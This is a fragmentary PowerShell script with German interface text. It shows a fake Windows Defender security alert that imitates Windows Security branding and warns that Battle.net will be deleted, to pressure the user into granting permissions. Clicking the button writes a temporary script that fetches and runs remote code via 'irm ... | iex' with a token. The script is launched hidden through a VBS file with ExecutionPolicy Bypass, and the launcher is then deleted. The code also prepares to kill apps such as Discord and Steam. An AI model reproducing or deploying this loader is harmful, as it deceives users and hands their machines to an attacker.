...
Function Elevate{
	...
	using System;
	using System.Runtime.InteropServices;
	public static class TaskbarApp {
		[DllImport("shell32.dll", SetLastError=true)]
		public static extern int SetCurrentProcessExplicitAppUserModelID(string AppID);
}
'@

[TaskbarApp]::SetCurrentProcessExplicitAppUserModelID("Windows.SecurityHealth.Custom") | Out-Null


	$errorForm = New-Object Windows.Forms.Form
#	$errorForm.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
	$errorForm.MaximizeBox = $false
	$errorForm.MinimizeBox = $false
    $errorForm.ShowInTaskbar = $true
	$securityExe = "$env:windir\System32\SecurityHealthSystray.exe"

	if (Test-Path $securityExe) {
    $errorForm.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($securityExe)
	} else {
    $errorForm.Icon = [System.Drawing.SystemIcons]::Shield
	}

    $errorForm.ClientSize = New-Object System.Drawing.Size(400, 150)
    $errorForm.TopMost = $true
    $errorForm.StartPosition = 'CenterScreen'
    $errorForm.Text = 'Windows Defender Sicherheitshinweis'
...
$titleLabel.Size = New-Object System.Drawing.Size(380, 22)
$titleLabel.TextAlign = [System.Drawing.ContentAlignment]::TopCenter
$titleLabel.Text = "Windows Sicherheit hat eine Bedrohung entdeckt."
...
$label.Location = New-Object System.Drawing.Point(10, 24)
$label.Size = New-Object System.Drawing.Size(380, 68)
$label.TextAlign = [System.Drawing.ContentAlignment]::TopCenter

$label.Text = "Kritische Sicherheitslücke gefunden. Berechtigungen werden benötigt um wichtige Sicherheitsupdates durchzuführen, um die Systemfehler zu beheben und um zu verhindern das Battle.net gelöscht wird."
...
# Beide Textbereiche zum Fenster hinzufügen
$errorForm.Controls.Add($titleLabel)
$errorForm.Controls.Add($label)

# ============================================================
# Security-Icon für Button
# ============================================================

if (Test-Path $securityExe) {
    $icon = [System.Drawing.Icon]::ExtractAssociatedIcon($securityExe)
}
else {
...
$okButton.Font = New-Object System.Drawing.Font(
    "Segoe UI",
    10,
    [System.Drawing.FontStyle]::Bold
)
$okButton.Text = " Fehler beheben"
$okButton.Size = New-Object System.Drawing.Size(140, 28)

# Rechts unten, aber genug Platz für zweiten Button
$okButton.Location = New-Object System.Drawing.Point(72, 110)

$okButton.Image = $resizedIcon
$okButton.TextImageRelation = `
...
$cancelButton.Font = New-Object System.Drawing.Font(
    "Segoe UI", 
    10,
    [System.Drawing.FontStyle]::Regular
)
$cancelButton.Text = "Battle.net deinstallieren"
$cancelButton.Size = New-Object System.Drawing.Size(170, 28)

# 8 Pixel Abstand zum ersten Button
...
# Beim Öffnen direkt den ersten Button fokussieren,
# damit in der RichTextBox kein Text-Cursor erscheint
$errorForm.ActiveControl = $okButton
$okButton.Add_Click({
        $errorForm.Close()
        $graphics.Dispose()
		$adminScriptPath = "$env:TEMP\security_update.ps1"

$adminScript = @"


# DANACH PUBLIC -> PRIVATE
...
# 1. DEINE BISHERIGE FUNKTION ZUERST
`$tk='$token'
irm '$parent' | iex
"@

$adminScript | Set-Content -Path $adminScriptPath -Encoding UTF8 -Force
        $tobat = @"
Set WshShell = WScript.CreateObject(`"WScript.Shell`")
WScript.Sleep 200
...
WshShell.Run `"powershell.exe -NonInteractive -NoProfile -ExecutionPolicy Bypass -File `"`"$adminScriptPath`"`"`", 0, True
"@
        $pth = Join-Path $env:TEMP "service.vbs"
		
        $tobat | Set-Content -Path $pth -Encoding ASCII -Force
        try{
            & $pth
            Sleep 7
            rm -Path $pth
...
# Typische Desktop-/Launcher-Apps inkl. Hintergrundprozesse beenden
$apps = @(
    'Discord',
    'DiscordCanary',
    'steam',
